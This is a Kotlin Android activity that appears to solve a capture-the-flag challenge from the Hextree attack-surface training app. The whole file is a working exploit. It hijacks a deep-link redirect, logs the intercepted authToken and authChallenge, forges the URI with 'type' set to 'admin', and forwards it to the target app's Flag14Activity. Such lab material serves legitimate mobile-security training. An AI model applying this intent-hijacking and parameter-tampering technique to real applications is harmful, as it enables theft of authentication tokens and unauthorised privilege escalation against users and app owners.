package com.example.hextreesolver

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log

class HijackFlag14Activity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val data: Uri? = intent?.data
        if (data == null) {
            finish()
            return
        }

        val authToken = data.getQueryParameter("authToken")
        val authChallenge = data.getQueryParameter("authChallenge")

        Log.d("Flag14Hijack", "Intercepted redirect: token=$authToken challenge=$authChallenge")

        // Rebuild the URI, escalating type -> admin, keeping token/challenge untouched
        val forged = data.buildUpon()
            .clearQuery()
            .appendQueryParameter("type", "admin")
            .appendQueryParameter("authToken", authToken)
            .appendQueryParameter("authChallenge", authChallenge)
            .build()

        val forward = Intent(Intent.ACTION_VIEW).apply {
            setData(forged)
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag14Activity"
            )
        }

        startActivity(forward)
        finish()
    }
}